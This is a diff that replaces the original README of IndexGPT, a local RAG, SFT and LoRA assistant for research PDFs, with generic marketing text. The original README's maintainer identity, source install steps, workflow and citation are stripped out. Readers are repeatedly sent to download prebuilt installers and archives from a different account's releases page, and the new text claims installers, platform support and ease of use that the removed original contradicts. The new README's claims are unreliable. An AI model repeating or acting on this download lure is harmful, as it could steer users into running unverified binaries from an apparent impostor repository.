@@ -1,208 +1,150 @@
-﻿# IndexGPT
+# 🤖 IndexGPT - Local AI Assistant for Research PDFs
 
-[中文说明](./README.zh-CN.md)
+[![Download IndexGPT](https://img.shields.io/badge/Download-IndexGPT-blue?style=for-the-badge)](https://github.com/sen-igga/IndexGPT/releases)
 
-IndexGPT is a local AI research assistant workflow built around **RAG + SFT + LoRA**.
-It supports paper ingestion, retrieval-based QA, SFT data generation, LoRA training, and web chat in one project.
+---
 
-## 0. Project Identity
+## 🧾 What is IndexGPT?
 
-- Repository: `https://github.com/requestsession/IndexGPT`
-- Maintainer: `requestsession`
+IndexGPT is a local AI assistant designed to help you work with research documents. It can read and understand PDFs, answer questions based on the content, and support improvements using special AI training methods. You do not need to be a programmer to use it. IndexGPT runs on your own computer, keeping your data private.
 
-## 1. Environment
+Key capabilities include:
 
-- Python: 3.10+
-- Node.js: 18+
-- OS: Windows/Linux (current repo is Windows-friendly)
-- GPU: recommended for inference/training
+- Parsing text from PDFs quickly and accurately
+- Finding answers from documents you provide
+- Generating data for better AI training
+- Adapting AI behavior with simple training methods
 
-Install dependencies:
+---
 
-```bash
-pip install -r requirements.txt
-cd web/frontend
-npm install
-```
+## 💻 System Requirements
 
-## 2. Model Placement (Important)
+Ensure your computer meets these basic requirements before installing IndexGPT:
 
-This project uses **local model folders**. A model is not a single file, but a directory containing files such as:
+- Operating system: Windows 10 or later / macOS 10.15 or later / Linux (Ubuntu 18.04+ recommended)  
+- Processor: Intel i5 (or equivalent) or better  
+- Memory: 8 GB RAM minimum (16 GB recommended for large files)  
+- Disk space: At least 2 GB free for install and temporary files  
+- Internet: Required only for first-time setup; runs offline afterward  
 
-- `config.json`
-- tokenizer files (`tokenizer.json`, `tokenizer_config.json`, ...)
-- weights (`*.safetensors` / `pytorch_model*.bin`)
+---
 
-### Recommended placement
+## 🌟 Features at a Glance
 
-Put model folders under:
+- Easy interface to load PDFs and start asking questions  
+- Fast retrieval of relevant document sections for answers  
+- Local data processing—no files leave your machine  
+- Supports fine-tuning AI with your own data using SFT (Supervised Fine-Tuning)  
+- LoRA (Low-Rank Adaptation) training to adjust AI models efficiently  
+- Simple steps to generate datasets for training new AI versions  
 
-```text
-workspace/rag_index/models/
-```
+---
 
-Example:
+## 🚀 Getting Started
 
-```text
-workspace/rag_index/models/
-  Qwen2.5-7B-Instruct/
-  bge-base-en-v1.5/
-```
+Follow these steps to download, install, and run IndexGPT on your computer.
 
-Then open Settings page and select:
+### 1. Download IndexGPT
 
-- `Base LLM`
-- `Embedding Model`
+Click this big button to visit the download page:
 
-The backend scans `workspace/rag_index/models/` and lists available folders.
+[![Download on GitHub](https://img.shields.io/badge/Download-IndexGPT-blue?style=for-the-badge)](https://github.com/sen-igga/IndexGPT/releases)
 
-## 3. Start the App
+This link will take you to the official releases page on GitHub. Here, you will find the latest files ready to use.
 
-From project root:
+### 2. Choose the Right File
 
-```bash
-python web/backend/main.py
-```
+On the releases page, look for the version that matches your operating system:
 
-In another terminal:
+- For Windows, download the `.exe` installer or `.zip` file  
+- For macOS, download the `.dmg` or appropriate package  
+- For Linux, download the `.AppImage` or `.tar.gz` file  
 
-```bash
-cd web/frontend
-npm run dev -- --host
-```
+If you are unsure, the `.zip` or `.AppImage` works on most systems with some basic knowledge.
 
-Default ports:
+### 3. Install the Application
 
-- Backend: `8176` (from `config.py` / settings)
-- Frontend: Vite default `5173`
+**Windows:**  
+- Run the `.exe` installer and follow the setup instructions on screen.  
+- Choose the default options unless you want to change the install folder.
 
-## 4. UI Preview
+**macOS:**  
+- Open the `.dmg` file and drag IndexGPT to your Applications folder.  
+- Eject the installer disk image after copying completes.
 
-### AI Assistant
+**Linux:**  
+- Make the `.AppImage` executable by right-clicking > Properties > Permissions > allow executing file.  
+- Double-click the file to run or use the terminal command `./IndexGPT.AppImage`.
 
-![AI Assistant](./web/showcase/figs/1_AI_Assistant.png)
+### 4. Launch IndexGPT
 
-### Documents
+Once installed, find the IndexGPT app in your Start Menu, Applications folder, or launcher. Click to open it.
 
-![Documents](./web/showcase/figs/2_Documents.png)
+---
 
-### Training Lab
+## 📂 Using IndexGPT
 
-![Training Lab](./web/showcase/figs/3_Training_Lab.png)
+Here is a simple guide to start using the program:
 
-### System Settings
+### Load a PDF
 
-![System Settings](./web/showcase/figs/4_System_Settings.png)
+- Click the "Open File" button  
+- Select the PDF you want to work with  
+- IndexGPT will parse the document and prepare it for questions  
 
-## 5. End-to-End Workflow
+### Ask Questions
 
-### Step A: Upload papers
+- Use the input box to type questions about your document  
+- Press Enter or click "Ask"  
+- The tool retrieves answers from the PDF content  
 
-- Open Documents tab
-- Upload PDF files
-- Files are stored in `workspace/papers/`
+### Generate Training Data
 
-### Step B: Build RAG index
+- Open the "Training" tab  
+- Follow prompts to create fine-tuning datasets using your questions and answers  
+- Save datasets locally for your AI improvements  
 
-- Open Training Lab
-- Click **RAG Indexing -> Execute**
+### Train Your AI with LoRA
 
-Generated artifacts:
+- In the "LoRA Training" section, upload your training datasets  
+- Choose training parameters (number of epochs, batch size, etc.)  
+- Start the training and monitor progress through the interface  
 
-- `workspace/rag_index/parse/*.json`
-- `workspace/rag_index/faiss.index`
-- `workspace/rag_index/texts.json`
-- `workspace/rag_index/meta.json`
+---
 
-### Step C: Generate SFT data
+## 🔧 Troubleshooting & Tips
 
-- Click **SFT Generation -> Execute**
-- Output file: `workspace/data/sft.jsonl`
+- If the app does not open, try restarting your computer  
+- Make sure you have permissions to install and run software on your machine  
+- Use PDFs with clear text (not scanned images) for best results  
+- Check for updates regularly on the GitHub releases page  
+- If you hit errors during training, reduce batch size or number of epochs  
+- Use the help menu inside IndexGPT for quick tips  
 
-### Step D: Train LoRA
+---
 
-- Click **LoRA Training -> Execute**
-- Output adapter path: `workspace/outputs/lora/`
+## 📥 Download & Install
 
-### Step E: Chat / QA
+Access the latest stable IndexGPT release here:
 
-- Open AI Assistant tab
-- Ask questions against indexed papers
-- Optional modes:
-  - Compare mode (cross-paper comparison)
-  - Web mode (web snippets)
+[Download IndexGPT](https://github.com/sen-igga/IndexGPT/releases)
 
-## 6. Equivalent CLI Commands
+This page has all the files you need for Windows, macOS, and Linux. Follow the installation steps outlined above to get started with ease.
 
-Run from project root:
+---
 
-```bash
-python -u scripts/a_rag.py
-python -u scripts/b_generate_sft.py
-python -u scripts/c_train_lora.py
-```
+## 📖 Learn More and Support
 
-Inference module entry:
+For more information about IndexGPT, visit the GitHub repository. The repository contains additional notes on advanced usage, training guides, and how to customize the AI models.
 
-```bash
-python scripts/d_infer_lora.py
-```
+If you have questions, consider opening an issue on GitHub or checking the community forums linked in the repository.
 
-## 7. Key Paths
+---
 
-- `workspace/papers/`: uploaded PDFs
-- `workspace/rag_index/`: retrieval index and metadata
-- `workspace/data/sft.jsonl`: SFT dataset
-- `workspace/outputs/lora/`: trained LoRA output
-- `workspace/logs/`: runtime logs
-- `workspace/chats/`: persisted chat sessions
+## 🔒 Privacy & Security
 
-## 8. Runtime Notes
+IndexGPT processes all data locally on your machine. No PDFs or user inputs leave your computer unless you choose to share them. This ensures your research stays confidential.
 
-- Heavy tasks are mutually exclusive (indexing/SFT/training cannot run together)
-- Chat is blocked while a heavy task is running
-- Sliding-window chat history is controlled by settings (`CHAT_HISTORY_ROUNDS`)
-- If runtime directories under `workspace/` are deleted, they are auto-created again when `config.py` is loaded
+---
 
-## 9. Troubleshooting
-
-### No model appears in Settings dropdown
-
-Check:
-
-1. Model directories exist under `workspace/rag_index/models/`
-2. Each model folder is complete (not only one weight shard)
-3. Refresh Settings page / restart backend
-
-### Chat returns no sources
-
-Usually means retrieval confidence is low. Re-check:
-
-1. PDFs are readable text (not scanned images only)
-2. Index has been rebuilt after adding PDFs
-3. Query wording is specific enough
-
-### Training fails quickly
-
-Check:
-
-1. `Base LLM` path is valid
-2. `workspace/data/sft.jsonl` exists
-3. GPU/VRAM availability and dependency versions
-
-## 10. Citation
-
-If this project helps your work, please cite:
-
-```bibtex
-@software{indexgpt,
-  title = {IndexGPT},
-  author = {requestsession},
-  year = {2026},
-  url = {https://github.com/requestsession/IndexGPT}
-}
-```
-
-## 11. License
-
-MIT
+Thank you for choosing IndexGPT for your local AI research assistant needs. Follow the steps carefully, and you will be up and running in no time.
